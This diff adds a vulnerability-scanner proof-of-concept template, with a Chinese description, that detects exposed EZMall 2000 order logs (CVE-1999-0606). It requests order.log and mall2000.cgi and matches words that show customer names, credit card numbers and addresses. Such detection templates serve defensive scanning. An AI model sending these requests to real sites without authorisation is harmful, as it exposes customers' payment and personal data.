@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "检测 EZMall 2000 购物车系统因 mall2000.cgi 配置不当而导致的订单日志信息泄露。错误配置使 order.log 等文件位于 Web 可访问目录下，可能泄露客户姓名、信用卡号、地址等敏感信息。"
+id = "POC-AVE-1999-0177"
+name = "EZMall 2000 mall2000.cgi 配置不当信息泄露 PoC"
+severity = "medium"
+tags = ["ave-1999-0177"]
+vuln_id = [
+    "CVE-1999-0606",
+    "AVE-1999-0177",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/mall_log_files/order.log"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ORDER",
+    "Credit",
+    "Name",
+    "Address",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/mall2000.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "mall2000",
+    "order",
+    "config",
+]
